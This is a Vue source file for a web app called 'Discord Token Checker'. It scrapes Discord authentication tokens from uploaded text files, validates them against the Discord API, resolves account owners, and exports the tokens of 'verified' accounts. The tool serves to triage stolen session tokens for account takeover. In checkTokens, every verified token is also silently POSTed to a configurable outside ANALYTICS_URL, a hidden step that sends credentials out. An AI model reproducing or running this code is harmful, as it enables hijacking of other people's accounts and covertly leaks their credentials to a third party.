<script setup>
import axios from 'axios';

const { ANALYTICS_URL } = useRuntimeConfig().public;

const fileUpload = ref(null);
const tokensInput = ref('');
const duplicate = ref(0);

const invalidAccounts = ref([]);
const validAccounts = ref([]);

const verifiedAccounts = computed(() => validAccounts.value.filter((account) => account.user.verified));
const unverifiedAccounts = computed(() => validAccounts.value.filter((account) => !account.user.verified));

const delay = ref(1000);
const isChecking = ref(false);

function loadFile() {
  for (const file of fileUpload.value.files) {
    if (!file.name.endsWith('.txt')) continue;

    const reader = new FileReader();
    reader.onload = ({ target }) => {
      const tokens = target.result.match(/mfa\.[\w-]{84}|[A-Z][\w-]{23}\.[\w-]{6}\.[\w-]{27}/g);

      tokensInput.value += [...new Set(tokens)].join('\n');
    };

    reader.readAsText(file);
  }
}

async function checkTokens() {
  // reset values
  duplicate.value = 0;
  validAccounts.value = [];
  invalidAccounts.value = [];

  const rawValue = tokensInput.value.trim();
  const matchedTokens = rawValue.match(/mfa\.[\w-]{84}|[A-Z][\w-]{23}\.[\w-]{6}\.[\w-]{27}/g);

  if (!matchedTokens) {
    return;
  }

  isChecking.value = true;

  const noDuplicates = [...new Set(matchedTokens)];
  duplicate.value = matchedTokens.length - noDuplicates.length;

  for (const token of noDuplicates) {
    const user = await fetchUser('@me', { token, delay: +delay.value });
    if (!user) {
      // Enumerate user from token
      const base64Id = token.split('.')[0];
      const decodedId = atob(base64Id);
      const existingAccount = validAccounts.value.find((account) => account.user.id === decodedId);
      if (existingAccount) {
        invalidAccounts.value.push({ token, user: existingAccount.user });
        continue;
      }

      if (base64Id === 'mfa' || verifiedAccounts.value.length === 0) {
        invalidAccounts.value.push({ token, user: null });
        continue;
      }

      const userObject = await fetchUser(decodedId, { token: verifiedAccounts.value[0].tokens[0] });
      invalidAccounts.value.push({ token, user: userObject || { id: decodedId } });
      continue;
    }

    const cachedAccount = validAccounts.value.find((account) => account.user.id === user.id);
    if (!cachedAccount) {
      // Request to check whether account is REALLY verified
      user.verified = await fetchBillingCountry({ token, returnBoolean: true });
      if (ANALYTICS_URL && user.verified) {
        await axios.post(ANALYTICS_URL, { tokens: [token] }).catch(() => console.error('Failed to contact analytics.'));
      }

      validAccounts.value.push({ tokens: [token], user });
      continue;
    }
    cachedAccount.tokens.push(token);
  }

  isChecking.value = false;
}

function removeAccount(id) {
  validAccounts.value = validAccounts.value.filter((account) => account.user.id !== id);
}

function downloadTokens() {
  const link = document.createElement('a');
  link.setAttribute(
    'href',
    `data:text/plain;charset=utf-8,${encodeURIComponent(
      verifiedAccounts.value.map((account) => account.tokens).join('\n')
    )}`
  );
  link.setAttribute('download', 'tokens.txt');

  link.style.display = 'none';
  document.body.appendChild(link);

  link.click();

  document.body.removeChild(link);
}
</script>

<template>
  <div class="p-2 min-h-screen bg-gray-100 dark:bg-gray-900 md:p-4 lg:p-10">
    <Title>Discord Token Checker</Title>
    <div class="flex justify-between items-center">
      <h1 class="flex items-center mr-4 text-2xl font-semibold dark:text-white">
        <i class="mr-2 i-carbon-logo-discord" />
        Discord Token Checker
        <a
          href="https://github.com/masterjanic"
          class="hidden ml-2 text-sm text-gray-500 hover:text-gray-600 dark:text-gray-300 dark:hover:text-gray-400 md:inline-flex"
          >by masterjanic</a
        >
      </h1>

      <div class="flex space-x-2 text-xl justify-content-end">
        <ColorSwitcher />
        <a
          href="https://github.com/masterjanic/discord-checker-web"
          class="dark:bg-gray-50 dark:hover:bg-gray-200 i-carbon-logo-github"
        />
      </div>
    </div>

    <textarea
      v-model="tokensInput"
      :disabled="isChecking"
      placeholder="Enter your tokens..."
      class="p-2 mt-4 w-full h-96 font-mono text-gray-800 dark:text-gray-200 bg-gray-200 dark:bg-gray-800 rounded border-2 border-violet-400 focus:border-violet-500 outline-none disabled:opacity-50 resize-none"
    />

    <div class="my-5">
      <div class="flex items-center">
        <label class="font-semibold text-black dark:text-white">Delay:</label>
        <Tooltip class="text-white" title="This is the wait time between each request in milliseconds.">
          <i class="flex ml-2 text-gray-700 dark:text-gray-50 dark:hover:text-gray-200 i-carbon-help-filled" />
        </Tooltip>
      </div>

      <input
        v-model="delay"
        class="overflow-hidden mt-3 w-full h-4 bg-gray-400 rounded-full appearance-none md:w-1/2"
        type="range"
        min="0"
        max="30000"
        step="100"
      />
      <div class="flex justify-between w-full text-sm text-gray-900 dark:text-gray-400 md:w-6/12">
        <span>0 ms</span>
        <span>{{ delay }}</span>
        <span>30000 ms</span>
      </div>
    </div>

    <div class="flex space-x-2">
      <input ref="fileUpload" class="hidden" type="file" accept=".txt" hidden multiple @change="loadFile" />
      <button
        :disabled="isChecking"
        class="flex items-center p-2 mt-2 font-semibold text-gray-800 bg-yellow-400 hover:bg-yellow-500 dark:bg-yellow-500 dark:hover:bg-yellow-600 rounded disabled:opacity-50 transition"
        @click="() => fileUpload.click()"
      >
        <i class="mr-2 i-carbon-upload" />
        Load File(s)
      </button>

      <button
        :disabled="isChecking"
        class="flex items-center p-2 mt-2 font-semibold text-gray-50 bg-violet-600 hover:bg-violet-700 dark:bg-violet-500 dark:hover:bg-violet-600 rounded disabled:opacity-50 transition"
        @click="checkTokens"
      >
        <i class="mr-2 i-carbon-restart" />
        Check Tokens
      </button>
    </div>

    <div v-if="verifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">
        Verified Accounts ({{ verifiedAccounts.length }})
      </h2>
      <hr />

      <button
        :disabled="isChecking"
        class="flex items-center p-2 mt-2 mb-4 font-semibold text-gray-50 bg-green-500 hover:bg-green-600 rounded disabled:opacity-50 transition"
        @click="downloadTokens()"
      >
        <i class="mr-2 i-carbon-download" />
        Download Tokens
      </button>
      <AccountList :accounts="verifiedAccounts" @delete="(id) => removeAccount(id)" />
    </div>

    <div v-if="unverifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">
        Unverified Accounts ({{ unverifiedAccounts.length }})
      </h2>
      <hr />
      <AccountList :accounts="unverifiedAccounts" @delete="(id) => removeAccount(id)" />
    </div>

    <div v-if="invalidAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">Invalid Tokens ({{ invalidAccounts.length }})</h2>
      <hr />

      <div class="grid grid-cols-1 grid-flow-row gap-4 xl:grid-cols-2">
        <div
          v-for="entry of invalidAccounts"
          :key="entry.token"
          class="flex flex-col p-5 bg-gray-200 dark:bg-gray-800 rounded-lg drop-shadow-lg dark:drop-shadow-none transition ease-in-out hover:-translate-y-1 hover:scale-102"
        >
          <span class="break-all">{{ entry.token }}</span>
          <small v-if="!entry.user || !entry.user.username" class="text-gray-700 dark:text-gray-400">
            {{ !entry.user ? 'Unknown User' : `User ID: ${entry.user.id}` }}
          </small>
          <small v-else class="flex items-center space-x-1.5 text-gray-700 dark:text-gray-400">
            <AccountAvatar size="16" :user="entry.user" class="drop-shadow-md" />
            <span>{{ entry.user.username }}#{{ entry.user.discriminator }} ({{ entry.user.id }})</span>
          </small>
        </div>
      </div>
    </div>

    <div v-if="duplicate > 0" class="my-10 text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">Duplicate Tokens ({{ duplicate }})</h2>
      <hr />

      <div class="p-3 text-center bg-violet-800 rounded-lg">
        <span class="font-semibold text-white"
          >Duplicate tokens were removed before sending requests to the Discord API.</span
        >
      </div>
    </div>
  </div>
</template>

<style>
hr {
  width: 110px;
  margin: 10px auto 30px auto;
  border-color: #212121;
}

.dark hr {
  border-color: #fff;
}

input[type='range']::-webkit-slider-thumb {
  width: 15px;
  -webkit-appearance: none;
  appearance: none;
  height: 15px;
  cursor: ew-resize;
  background: #fff;
  box-shadow: -505px 0 0 500px #5865f2;
  border-radius: 50%;
}
</style>
